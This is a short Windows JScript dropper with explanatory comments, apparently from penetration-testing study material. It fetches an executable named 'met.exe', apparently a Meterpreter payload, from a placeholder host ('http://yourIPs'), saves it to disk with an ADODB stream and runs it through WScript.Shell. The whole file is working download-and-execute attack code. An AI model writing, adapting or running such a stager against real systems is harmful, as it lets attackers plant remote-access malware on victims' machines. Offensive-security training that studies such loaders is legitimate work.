//Create MSXML2.XMLHTTP object, it provide client-side protocol support to communicate with HTTP servers
var url = "http://yourIPs/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

//open, and send method to download web content.
//open method thrid argument indicates that the request should be synchronous 
Object.Open('GET', url, false);
Object.Send();

//after sending get requestm check HTTP 200, Ok Status Code,

if (Object.Status == 200)
{
	//create a ADO Stream Object-> used to read/write binary
	var Stream = WScript.CreateObject('ADODB.Stream');
	//invoke open on Steam object and begin editing
	Stream.Open();
	//set type to 1, which is binary content
	Stream.Type = 1;
	
	//write http response, the binay to our steam object, Posistion point to 0, the beginning of its content
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;

	// 2 force a file overwrite
	Stream.SaveToFile("met.exe", 2);
	Stream.Close();
}
//run the binary
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
